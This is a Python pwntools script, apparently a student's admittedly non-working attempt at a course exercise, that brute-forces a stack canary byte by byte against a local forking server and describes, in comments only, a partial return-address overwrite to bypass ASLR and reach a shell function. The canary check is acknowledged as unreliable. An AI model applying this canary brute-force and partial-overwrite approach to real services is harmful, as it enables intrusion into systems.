#!/usr/bin/env python3

"""
THIS DOES NOT WORK

Instead, this our somewhat sad attempt at getting at least some points for this
exercise after failing to solve it for quite some time.

The code below will show how we *intended* to solve the task.
"""

from time import sleep
from pwn import *
import os

context.log_level = "error"


def start_server():
    # you might want to remove the DEVNULL lines
    # during the development of the exploit to see
    # errors -> in the final solution we just want to see the flag :)
    return subprocess.Popen(
        ["./forkingserver"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )


def get_connection():
    return remote("localhost", 6666)


def int_to_byte(i):
    return bytes([i])


def get_next_canary(current_string):

    # iterate over all possible byte values (0x00 ... 0xff)
    for counter in range(0,256):
        io = get_connection()
        input = current_string + int_to_byte(counter)
        io.write(input)
        answer = io.recv().decode("utf-8")

        # we failed to reliably determine wether the canary has been actually
        # corrupted or not, our results here are pretty much random. idk man :(
        if "stack smashing" not in answer:
            return int_to_byte(counter)
        # we also tried checking if the current socket file descriptor is still
        # open, but since it also closes when the canary was not corrupted
        # that sucked as well


def main():
    # the forkingserver that accepts connections
    server = start_server()

    #72 bytes of stuff
    base = b"iiiiiiiiixiiiiiiiiixiiiiiiiiixiiiiiiiiixiiiiiiiiixiiiiiiiiixiiiiiiiiixii"
    # canary is saved in little endian, so we know the first byte is 0x00
    current_string = base + b"\x00"
    
    # find out the other 7 bytes of the canary via brute force
    for byte in range(0,7):
        next_canary_byte = get_next_canary(current_string)
        current_string = current_string + next_canary_byte

    # now that we know the value of our canary, we can try to overwrite the 
    # return address thats sitting on the stack (to execute plsgivemeshell)

    # given that we never made it to this part, Im tempted to just write
    # "please refer to slides 07-107 and following"

    # since the return address is also stored in little endian, we can overwrite
    # its least significant bytes, thus enabling us to circumvent the ASLR.
    # The only problem left is that we actually need to guess the 4 correct 
    # changing bits:
    #
    # .... .... ???? 0100 0100 0000
    #
    # but given that we only need to guess 2‚Å¥ bits, we can brute force this too

    print("https://imgflip.com/i/5xwaxd")


if __name__ == "__main__":
    main()
